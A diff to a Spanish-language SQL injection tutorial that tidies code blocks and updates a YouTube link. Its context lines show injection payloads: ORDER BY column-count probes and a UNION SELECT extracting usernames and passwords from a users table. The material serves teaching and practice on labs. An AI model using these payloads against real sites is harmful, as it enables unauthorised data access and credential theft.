@@ -47,7 +47,6 @@ Permite entrar a una cuenta sin contraseña.
 Para saber cuántas columnas tiene la tabla actual.
 
 ```SQL
-
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
@@ -57,7 +56,6 @@ Para saber cuántas columnas tiene la tabla actual.
 Una vez sabemos el número de columnas, extraemos información sensible.
 
 ```SQL
-
 ' UNION SELECT NULL, username, password FROM users--
 ```
 
@@ -86,7 +84,7 @@ Cookie: session=xyz123...
 
 Estos son los sitios que utilizo para practicar y profundizar en mis investigaciones:
 
-* [📺 **Mi video de Youtube sobre SQL Injection**](https://youtu.be/ffGYhkk8CCw?si=Yu8xhrxB80h-741V) - Explicación paso a paso.
+* [📺 **Mi video de Youtube sobre SQL Injection**](https://www.youtube.com/watch?v=ffgYhkk8CCw) - Explicación paso a paso.
 * [🎯 **PortSwigger Academy**](https://portswigger.net/web-security) - Laboratorios gratuitos de alta calidad.
 * [📂 **PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) - Repositorio con miles de payloads listos para usar.
 * [🛡️ **OWASP SQL Injection Guide**](https://owasp.org/www-community/attacks/SQL_Injection) - La guía técnica oficial para entender y prevenir este ataque.
